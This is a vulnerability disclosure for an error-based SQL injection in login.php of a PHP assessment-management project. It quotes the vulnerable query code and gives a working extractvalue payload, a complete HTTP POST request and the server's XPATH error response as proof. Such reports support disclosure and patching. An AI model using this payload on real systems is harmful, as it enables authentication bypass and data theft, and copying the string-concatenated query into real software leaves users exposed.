## ASSESSMENT MANAGEMENT IN PHP WITH SOURCE CODE login.php SQL Injection (error-based) Vulnerability

### I. Vulnerability Impact

An unauthenticated attacker can inject arbitrary SQL into the login query through the `userid` parameter, bypassing authentication without any valid credentials. Because the MySQL error message is echoed back to the client by `die(mysqli_error($conn))`, the attacker gains a reliable error-based channel to extract sensitive data (e.g. current database name, table contents) row by row. Depending on the database account privileges, the attacker may also read server files or write files.

### II. Source Code Analysis

The vulnerability resides in `login.php`, lines 21-25:

```php
$username = $_POST['userid'];
$pass = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$pass'";
$result = mysqli_query($conn, $sql)  or die("Could not connect database " .mysqli_error($conn));
```

The `userid` parameter is taken directly from `$_POST` and concatenated into the SQL statement without any filtering, escaping, or prepared statements. When the injected fragment makes MySQL raise an error, the raw error text is printed to the page by `die()`, which gives the attacker a direct error-based echo channel for data extraction. A second identical vulnerable query block also exists at lines 63-67 of the same file.

### III. Payload

The core injection payload is:

```
student'and/**/extractvalue(1,concat(char(126),md5(1531599458)))and'
```

The transformed SQL after injection is:

```sql
SELECT * FROM users WHERE username = 'student'and/**/extractvalue(1,concat(char(126),md5(1531599458)))and'' AND password = 'pass'
```

HTTP request:

```http
POST /login.php HTTP/1.1
Host: assessment
Content-Length: 97
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0
Origin: http://assessment
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://assessment/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=kl55nmtjo1bgph7dnk408lmcah
Connection: keep-alive

userid=student'and/**/extractvalue(1,concat(char(126),md5(1531599458)))and'&password=pass&submit=
```

Server response snippet proving the vulnerability:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
X-Powered-By: PHP/7.3.4
Content-Type: text/html; charset=UTF-8

Could not connect database XPATH syntax error: '~23f8d4c1314c10f17627db5543205fe'
```

The echoed value matches `md5("1531599458") = 23f8d4c1314c10f17627db5543205fe8` truncated to 31 characters by the 32-byte XPATH error limit of `extractvalue()`, which proves the injection and the error-based echo channel.

### IV. Source Download

https://code-projects.org/assessment-management-in-php-with-source-code/



![image-20260824093811875](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824093811875.png)
